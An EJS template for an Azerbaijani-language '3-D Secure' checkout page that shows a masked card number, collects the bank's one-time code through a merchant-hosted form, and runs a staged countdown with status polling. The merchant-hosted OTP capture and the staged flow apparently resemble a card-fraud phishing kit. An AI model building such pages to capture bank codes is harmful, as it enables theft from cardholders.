<section class="section">
  <div class="container">
    <div style="max-width:560px;margin:0 auto">
      <div class="card">
        <div class="card__head">
          <span>3-D Secure</span>
          <span class="badge badge--gold"><%= cardMasked || '' %></span>
        </div>
        <div class="card__body">
          <div id="stageBox" class="text-center"
               data-status-url="/api/payment/<%= order._id %>/status"
               data-order-id="<%= order._id %>"
               data-stage="otp_entry"
               data-stage-seconds="<%= screen.stageSeconds %>"
               data-seconds-left="<%= screen.secondsLeft %>">

            <h1 style="font-size:1.25rem" data-stage-title>Telefonunuza gələn OTP kodunu daxil edin</h1>
            <p class="sec-note" data-stage-note>Bank <%= cardMasked %> nömrəli karta bağlı telefona bir dəfəlik kod göndərdi.</p>

            <%- include('../partials/countdown-ring') %>

            <div id="otpNote" class="hidden alert"></div>

            <form id="otpForm" data-order-id="<%= order._id %>">
              <div class="field">
                <label for="otpCode">3-D OTP kodu</label>
                <input type="text" id="otpCode" name="code" class="otp-input mono" inputmode="numeric"
                       autocomplete="one-time-code" maxlength="8" placeholder="______" required />
              </div>
              <button type="submit" class="btn btn--primary btn--block btn--lg">Ödənişi təsdiqlə</button>
            </form>

            <dl class="kv" style="text-align:left;margin-top:20px">
              <dt><%= t('payment.orderLabel') %></dt><dd><%= order.orderNo %></dd>
              <dt><%= t('checkout.total') %></dt><dd class="mono"><%= order.total.toFixed(2) %> ₼</dd>
            </dl>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>

<style>
  .otp-input { text-align: center; font-size: 1.6rem; letter-spacing: .5em; padding: 12px; }
</style>

<script src="/public/js/secure-flow.js?v=<%= assetV %>" defer></script>
